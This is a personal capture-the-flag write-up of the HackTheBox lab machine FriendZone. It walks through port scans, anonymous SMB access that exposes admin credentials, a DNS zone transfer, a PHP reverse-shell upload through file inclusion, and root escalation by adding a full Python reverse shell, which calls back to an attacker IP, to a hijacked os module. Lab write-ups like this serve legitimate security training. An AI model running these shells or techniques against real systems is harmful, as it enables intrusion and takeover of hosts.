# Detailed Port discovery
```
PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           vsftpd 3.0.3
22/tcp    open   ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp    open   domain        ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp    open   http          Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp   open   netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp   open   ssl/http      Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp   open   netbios-ssn   Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
2515/tcp  closed facsys-router
11570/tcp closed unknown
16809/tcp closed unknown
21833/tcp closed unknown
39412/tcp closed unknown
56782/tcp closed unknown
58895/tcp closed unknown
61101/tcp closed unknown
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2024-11-11T21:19:51+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-11-11T19:19:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.61 seconds

```
# Quick Port discovery
```
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
53/tcp  open  domain       syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
443/tcp open  https        syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

# Checks
## Smb check
Using #smbclient we can list all the available shares and try to connect to them as an anonymous user (`-U%` option).
In there we quickly find some interesting file `cred.txt`:
```
creds for the admin THING:

admin:WORKWORKHhallelujah@#

```

## Initial creds check
After trying some SMB and some SSH logins without success, I then go for http servers to check if there is any interesting.

## Web content discovery

Nothing at first. I've tried port `80` and port `443` with some configurations with #gobuster and #ffuf and nothing was found with dns and fuzzing.

Let's get back to dir list and try with the `443` port this time: nothing.

Let's take a look back to the ports and check how the domain service could be exploited.


#### Trying to dig into the DNS
Using some #dns-discovery with #dig we obtain the server namespace:
```
ns1.tacomadc.com.
ns2.tacomadc.com.

dig any friendzone.red @$(cat ip)


#Perform enumeration actions
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <IP>
```


#### Re-asking google for the proper task.
After searching for subdomains finders, I've found some interesting tool for subdomains discovery. #sublist3r 

After installing and using the sublist3r tool, I've found a list of potential subdomains, so let's check if any of them does return a login webpage with a custom script (generated by ChatGPT for sure):
```
#!/bin/bash

# Check if exactly two arguments are provided
if [ "$#" -ne 2 ]; then
  echo "Usage: $0 <input_file> <search_string>"
  exit 1
fi

INPUT_FILE="$1"
SEARCH_STRING="$2"

# Check if the input file exists
if [ ! -f "$INPUT_FILE" ]; then
  echo "Error: File '$INPUT_FILE' not found."
  exit 1
fi

# Read each subdomain from the file and perform the search
while IFS= read -r subdomain; do
  # Fetch the content of the subdomain using curl with error handling
  response=$(curl -s --max-time 10 "$subdomain" 2>/dev/null)
  
  # Check if the response contains the search string
  if echo "$response" | grep -iq "$SEARCH_STRING"; then
    echo "Found '$SEARCH_STRING' in $subdomain"
  else
    echo "Not found in $subdomain"
  fi
done < "$INPUT_FILE"
```
Then we can take the output of the sublist3r and try to find for "login" in any response.

After nothing interesting, I get back to #dig command and manage to obtain diferent subdomains with:
```
 dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.18.28-0ubuntu0.20.04.1-Ubuntu <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800

```

And after adding them to `/etc/hosts` we manage to find a login form over `administrator1.friendzone.red`

Once we log in with the obtained credentials in the administrator1 subdomain, we also check the `upload` subdomain, and it definitely looks like we can upload some files to it. Let's try to upload some and load them.

I've searched for a php [revshell](https://www.revshells.com/Perl%20PentestMonkey\?ip\=10.10.16.6\&port\=31415\&shell\=sh\&encoding\=sh) and uploaded it, and obtained the following output:
```
Uploaded successfully !  
1731377382
```
But I cannot find the image over `https://administrator1.friendzone.red/images/`

Tried a new one:
```
Uploaded successfully !  
1731377556
```

The upload part seems to be completely decoupled from the administration1 one, so we start focusing on the second one.
In there we can observe that the output of the pagename parameter is actually a php file being opened: `timestamp.php` so let's try some fuzzing.

After looking the write-up, it looks like there is some awesome nmap script for enumerate smb shares that also leaks some further information:
```
nmap --script smb-enum-shares.nse $(cat ip)

Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-12 03:22 CET
Nmap scan report for friendzoneportal.red (10.10.10.123)
Host is up (0.60s latency).
Not shown: 993 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.10.123\Development:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

```

And `/etc/Development` looks like the path where the local file is being included. Now we need to find a way to obtain a rce.

After searching in SecList for some PHP files, I've found some php-reverse-shell, and after trying it, it works like a charm.

So we are in and we have user.txt:
```
1ec1....
```

Once we are in it looks like there is a new open port `953` but it's all about dns so not interesting.

After searching around, we find out an interesting process being executed with pspy: `/opt/server_admin/reporter.py` 
In there only a print and an import are preset, but since the python being used is the one under `/usr/bin` we can check if we can access the `so` module being imported and add some malicious code.

Since the UID of the process launching the script is 0 (root) trying a new reverse shell by adding the following python code to the `os.py` file:
```
#!/usr/bin/python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.16.6",1314));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
After some waiting with a nc opened,  we manage receive the shell and voila! A simple whoami will show you that we are done:

```
root.txt
3bb45...
```
